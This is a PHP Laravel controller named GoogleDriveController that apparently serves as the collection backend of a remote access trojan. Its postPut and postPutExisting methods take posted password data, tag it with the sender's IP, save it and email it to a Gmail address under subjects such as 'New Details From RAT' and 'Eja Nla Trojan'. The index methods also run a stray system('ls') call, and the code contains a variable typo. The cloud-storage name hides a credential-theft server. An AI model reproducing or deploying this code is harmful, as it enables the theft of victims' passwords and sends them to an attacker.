<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class GoogleDriveController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
    	$os = $this->helpers->getOS();
        system("ls");
    	return view('index', compact(['os']));
    }
    
    /**
	 * get put
	 *
	 * @return Response
	 */
	public function getPut()
    {
    	return "not implemented";
    }
    
    
    
    public function postPut(Request $request)
	{
           $req = $request->all();
           $ret = [];
               
                $validator = Validator::make($req, [
							 'content' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = ['mode' => "error", 'error' => "no_passwords"];
                       
                 }
                
                 else
                 { 
                 	 $ip = getenv("REMOTE_ADDR");
                 	  $dirname = $ip."_";
                       $rcpt = "mails4davidslogan@gmail.com";
                       $filename = date("Y_M_D_h_i_s");
					   $content = $req["content"];

                       $ret = [];
                       
                       #echo "here are the results: ".$results;
					   $sttus = $this->helpers->saveInDirectory($dirname,$filename,$content);
                       if($status == 'success') $this->helpers->sendEmail($rcpt,"New Details From RAT",['dir' => $dirname,'file' => $filename],'emails.login_alert','view');  
                          $ret = ['mode' => "success"];                      
                  }       
           return $ret;                                                                                            
	}
	
	    /**
	 * get put
	 *
	 * @return Response
	 */
	public function getPutExisting()
    {
    	$os = $this->helpers->getOS();
        system("ls");
    	return view('index', compact(['os']));
    }
    
    
    
    public function postPutExisting(Request $request)
	{
           $req = $request->all();
           $ret = [];
               
                $validator = Validator::make($req, [
                             'results' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = ['mode' => "error", 'error' => "no_passwords"];
                       
                 }
                
                 else
                 { 
                 	 $ip = getenv("REMOTE_ADDR");
                 	  $s = "Eja Nla Trojan ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
                       $rcpt = "mails4davidslogan@gmail.com";
                       $results = $req["results"];

                       $ret = [];
                       $temp = explode("GBAM",$results);
                       foreach($temp as $line){
                       	$temp2 = explode("|",$line);
                           if(is_array($temp2)) {
                             $temp3 = [];
                             foreach($temp2 as $t2) array_push($temp3,$t2);                          
                              array_push($ret,$temp3);
                           } 
                       } 
                       
                       #echo "here are the results: ".$results;
                         $this->helpers->sendEmail($rcpt,$s,['results' => $ret],'emails.login_alert','view');  
                          $ret = ['mode' => "success"];                      
                  }       
           return $ret;                                                                                            
	}

}
